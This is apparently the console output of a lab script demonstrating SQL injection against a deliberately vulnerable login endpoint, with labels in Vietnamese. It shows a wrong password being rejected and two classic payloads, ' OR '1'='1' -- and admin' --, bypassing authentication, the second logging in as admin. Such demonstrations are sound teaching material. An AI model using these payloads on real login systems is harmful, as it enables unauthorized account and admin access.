[*] Thử SQL Injection -> /api/login-vulnerable

  Đăng nhập thường, mật khẩu SAI
    username = 'user1' | password = 'sai_mat_khau'
    -> ✘ bị từ chối (HTTP 401) | Sai username hoặc mật khẩu.

  SQLI: ' OR '1'='1' --  (bỏ qua mật khẩu)
    username = "' OR '1'='1' --" | password = ''
    -> ✔ ĐĂNG NHẬP ĐƯỢC (HTTP 200) | 3 dòng khớp | Đăng nhập thành công! Chào user1 (user).

  SQLI: admin' --  (đăng nhập thẳng vào admin)
    username = "admin' --" | password = ''
    -> ✔ ĐĂNG NHẬP ĐƯỢC (HTTP 200) | 1 dòng khớp | Đăng nhập thành công! Chào admin (admin).
